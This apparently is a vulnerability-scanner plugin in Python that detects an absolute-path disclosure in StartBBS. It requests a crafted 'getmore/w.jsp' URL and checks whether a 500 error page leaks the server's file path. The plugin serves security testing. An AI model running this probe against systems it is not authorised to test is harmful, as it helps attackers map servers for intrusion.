#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#_PlugName_ = StartBBS Absolute Path Leakage
#_Function_ = StartBBS 物理路径泄露
#_FileName_ = StartBBS_Absolute_Path_Leakage.py

def assign(service, arg):
    if service == "startbbs":
        return True, arg 

def audit(arg):
    payload = 'index.php/home/getmore/w.jsp'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl('%s' % (target))
    Check_String = "Filename:"
    if code == 500:
    	if Check_String in res:
    		security_warning(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('startbbs', 'http://test.l1n3.net')[1])
